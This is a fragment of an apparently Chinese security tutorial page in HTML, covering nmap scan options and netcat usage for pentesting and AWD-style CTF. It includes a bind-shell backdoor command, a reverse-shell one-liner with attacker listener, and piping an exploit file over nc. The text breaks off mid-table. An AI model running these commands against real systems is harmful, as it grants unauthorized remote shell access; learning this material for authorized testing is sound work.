+&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
+&lt;p&gt;nmap 把端口分成六个状态: open (开放的)， closed (关闭的)，filtered (被过滤的)， unfiltered (未被过滤的)， open|filtered (开放或者被过滤的)，或者 closed|filtered (关闭或者被过滤的)&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;选项&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS&lt;/td&gt;
+&lt;td&gt;TCP SYN 扫描&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;常用&lt;/strong&gt;、快速执行、不打开一个完全的 TCP 链接&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sT&lt;/td&gt;
+&lt;td&gt;TCP connect () 扫描&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sU&lt;/td&gt;
+&lt;td&gt;UDP 扫描&lt;/td&gt;
+&lt;td&gt;UDP 扫描一般较慢，可以使用 --host-timeout 跳过慢速的主机&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-p &amp;lt;port ranges&amp;gt;&lt;/td&gt;
+&lt;td&gt;只扫描指定的端口或端口范围&lt;/td&gt;
+&lt;td&gt;-p - 从端口 1 扫描到 65535&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sV&lt;/td&gt;
+&lt;td&gt;版本探测&lt;/td&gt;
+&lt;td&gt;也可以 - A 同时启用操作系统检测和版本检测&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;输出格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输出格式&#34;&gt;#&lt;/a&gt; 输出格式&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;选项&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-oN &amp;lt;filespec&amp;gt;&lt;/td&gt;
+&lt;td&gt;标准输出&lt;/td&gt;
+&lt;td&gt;直接写入指定的文件&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG &amp;lt;filespec&amp;gt;&lt;/td&gt;
+&lt;td&gt;Grep 输出&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;常用实例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用实例&#34;&gt;#&lt;/a&gt; 常用实例&lt;/h3&gt;
+&lt;div class=&#34;note warning&#34;&gt;
+&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;br /&gt;
+如果是为了测试，&lt;a href=&#34;http://scanme.nmap.org&#34;&gt;scanme.nmap.org&lt;/a&gt; 允许被扫描。但仅允许使用 Nmap 扫描并禁止测试漏洞或进行 DoS 攻击。&lt;/p&gt;
+&lt;/div&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;/&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;子网掩码&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 网段扫描&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sP&lt;/span&gt; ip/子网掩码 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 扫描存活主机&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;端口号或范围&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sS&lt;/span&gt; -p- &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.0.2 &lt;span class=&#34;token comment&#34;&gt;# 扫描主机全部端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;172.20&lt;/span&gt;.x.x/24&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&#34;https://nmap.org/man/zh/index.html&#34;&gt;官方文档：&lt;/a&gt;&lt;a href=&#34;https://nmap.org/man/zh/index.html&#34;&gt;https://nmap.org/man/zh/index.html&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;nc基础使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nc基础使用&#34;&gt;#&lt;/a&gt; nc 基础使用&lt;/h2&gt;
+&lt;p&gt;监听本地端口&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvvp&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;port&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;连接指定端口&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;port&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;传送exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传送exp&#34;&gt;#&lt;/a&gt; 传送 exp&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; exp.txt &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-nv&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.x.x &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-nv&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.x.x &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; exp.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 两种方式均可以讲 exp 输送到指定端口，而服务器需要开放对应端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; /tmp/received_exploit.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 服务器监听端口并保存 exp&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;日志打印&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志打印&#34;&gt;#&lt;/a&gt; 日志打印&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; /apache/log.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 在 awd 中，攻击 80 端口的信息都会被打印下来，&gt; 表示覆写，&gt;&gt; 表示追加&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;-a选项的使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-a选项的使用&#34;&gt;#&lt;/a&gt; -A 选项的使用&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;选项&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-A + -sV&lt;/td&gt;
+&lt;td&gt;启用版本检测，用于识别目标主机上运行的服务及其版本信息&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-A + -O&lt;/td&gt;
+&lt;td&gt;启用操作系统检测，尝试识别目标主机的操作系统类型和版本&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-A + -T4&lt;/td&gt;
+&lt;td&gt;设置扫描的速度级别为快速（4），加快扫描速度但可能导致被检测到&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-A&lt;/td&gt;
+&lt;td&gt;执行高级扫描和识别&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nc命令进阶使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nc命令进阶使用&#34;&gt;#&lt;/a&gt; nc 命令进阶使用&lt;/h2&gt;
+&lt;h3 id=&#34;创造后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创造后门&#34;&gt;#&lt;/a&gt; 创造后门&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ncat &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10000&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; /bin/bash&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;-e&lt;/code&gt;  标志将一个  &lt;code&gt;bash&lt;/code&gt;  与端口  &lt;code&gt;10000&lt;/code&gt;  相连。现在客户端只要连接到服务器上的  &lt;code&gt;10000&lt;/code&gt;  端口就能通过  &lt;code&gt;bash&lt;/code&gt;  获取我们系统的完整访问权限：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ncat &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.1.100 &lt;span class=&#34;token number&#34;&gt;10000&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 攻击机上连接服务器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;扫描端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#扫描端口&#34;&gt;#&lt;/a&gt; 扫描端口&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;options&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;port-port&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以利用 - w 设置超时时间，-z 扫描，-u 设置为 UDP 模式，例如：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-z&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-w2&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.0.1 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;-65535 &lt;span class=&#34;token comment&#34;&gt;# 扫描 192.168.0.3 的端口 范围是 1-65535 即全部端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;note warning&#34;&gt;
+&lt;p&gt;&lt;strong&gt;注意：nc 扫描会留下大量的痕迹。&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;h3 id=&#34;反向连接弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反向连接弹shell&#34;&gt;#&lt;/a&gt; 反向连接弹 shell&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; /bin/bash &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;port&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 服务端发起连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvp&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;port&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 攻击机连 shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;完整使用说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#完整使用说明&#34;&gt;#&lt;/a&gt; 完整使用说明&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;教程再好终归不如官方文档&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;└─&lt;span class=&#34;token comment&#34;&gt;# nc -h                 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;v1.10-47&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;连接:   &lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-options&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;hostname&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;ports&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;. &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;监听入站:     &lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; port &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;-options&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;hostname&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;options:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; shell commands       命令为“-e”；prog 程序重定向，使用 /bin/sh 执行 &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;危险！！&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; filename             连接后执行的程序&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;危险！！&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-b&lt;/span&gt;                      允许广播&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-g&lt;/span&gt; gateway              网关源路由跳跃点，最多 &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt; 个&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-G&lt;/span&gt; num                  源路由指针：4, &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;, &lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt;                      this cruft  这个废话,就是帮助&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; secs                 发送线路、扫描端口的延迟间隔&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-k&lt;/span&gt;                      设置套接字上的 keepalive 选项&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt;                      监听模式，用于入站连接&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-n&lt;/span&gt;                      仅数字 IP 地址，无 DNS&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file&lt;/span&gt;                 文件十六进制转储流量&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; port                 本地端口号&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt;                      随机化本地和远程端口&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-q&lt;/span&gt; secs                 在 stdin 上的 EOF 和延迟秒后退出&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-s&lt;/span&gt; addr                 本地源地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; tos                  设置服务类型&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt;                      应答TELNET协商&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;                      UDP模式&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 